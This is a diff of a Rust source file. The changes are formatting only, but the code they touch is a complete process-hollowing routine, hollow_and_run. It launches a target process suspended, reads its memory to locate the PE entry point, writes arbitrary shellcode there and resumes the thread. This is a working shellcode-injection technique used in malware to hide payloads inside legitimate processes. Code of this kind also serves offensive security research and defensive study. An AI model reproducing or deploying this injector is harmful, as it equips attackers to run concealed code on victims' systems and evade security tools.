@@ -1,8 +1,11 @@
-use std::ffi::{CString, c_void};
+use std::ffi::{c_void, CString};
 use std::ptr;
 use windows::core::{PCSTR, PSTR};
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
-use windows::Win32::System::Threading::{CreateProcessA, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, PROCESSINFOCLASS, ResumeThread, STARTUPINFOA};
+use windows::Win32::System::Threading::{
+    CreateProcessA, NtQueryInformationProcess, ResumeThread, CREATE_SUSPENDED, PROCESSINFOCLASS,
+    PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, STARTUPINFOA,
+};
 
 const E_LFANEW_OFFSET: usize = 0x3C;
 const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
@@ -18,11 +21,8 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Use CreateProcessA to create a suspended process that will be hollowed out for the shellcode
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessA.html
-    let lp_command_line = PSTR(CString::new(target_process)
-        .unwrap()
-        .into_raw() as *mut u8
-    );
-    let creation_result = unsafe { 
+    let lp_command_line = PSTR(CString::new(target_process).unwrap().into_raw() as *mut u8);
+    let creation_result = unsafe {
         CreateProcessA(
             PCSTR::null(),
             lp_command_line,
@@ -33,7 +33,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             ptr::null(),
             PCSTR::null(),
             &STARTUPINFOA::default(),
-            &mut process_information
+            &mut process_information,
         )
     };
     if !creation_result.as_bool() {
@@ -45,13 +45,13 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
     let process_handle = process_information.hProcess;
     let mut basic_information = PROCESS_BASIC_INFORMATION::default();
-    if let Err(error) = unsafe { 
+    if let Err(error) = unsafe {
         NtQueryInformationProcess(
             process_handle,
             PROCESSINFOCLASS::default(),
             &mut basic_information as *mut _ as *mut c_void,
             POINTER_SIZE_TIMES_SIX,
-            ptr::null_mut()
+            ptr::null_mut(),
         )
     } {
         panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
@@ -68,7 +68,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             image_base_address as *const c_void,
             address_buffer.as_mut_ptr() as *mut c_void,
             address_buffer.len(),
-            ptr::null_mut()
+            ptr::null_mut(),
         )
     };
     if !read_result.as_bool() {
@@ -79,13 +79,13 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     let mut header_buffer = [0_u8; 0x200];
     let head_pointer_raw = header_buffer.as_mut_ptr() as usize;
     let pe_base_address = unsafe { ptr::read(address_buffer.as_ptr() as *const usize) };
-    let read_result = unsafe { 
+    let read_result = unsafe {
         ReadProcessMemory(
             process_handle,
             pe_base_address as *const c_void,
             header_buffer.as_mut_ptr() as *mut c_void,
             header_buffer.len(),
-            ptr::null_mut()
+            ptr::null_mut(),
         )
     };
     if !read_result.as_bool() {
@@ -101,13 +101,13 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
     let entry_point_rva = unsafe { ptr::read((head_pointer_raw + opthdr_offset) as *const u32) };
     let entry_point_address = entry_point_rva as usize + pe_base_address;
-    let write_result = unsafe { 
+    let write_result = unsafe {
         WriteProcessMemory(
             process_handle,
             entry_point_address as *const c_void,
             shellcode.as_ptr() as *const c_void,
             shellcode.len(),
-            ptr::null_mut()
+            ptr::null_mut(),
         )
     };
     if !write_result.as_bool() {
@@ -117,11 +117,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Start it back up with ResumeThread
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.ResumeThread.html
-    let resume_result = unsafe {
-        ResumeThread(
-            process_information.hThread
-        )
-    };
+    let resume_result = unsafe { ResumeThread(process_information.hThread) };
     if resume_result != 1 {
         panic!("Could not resume the suspended {target_process}'s execution");
     }
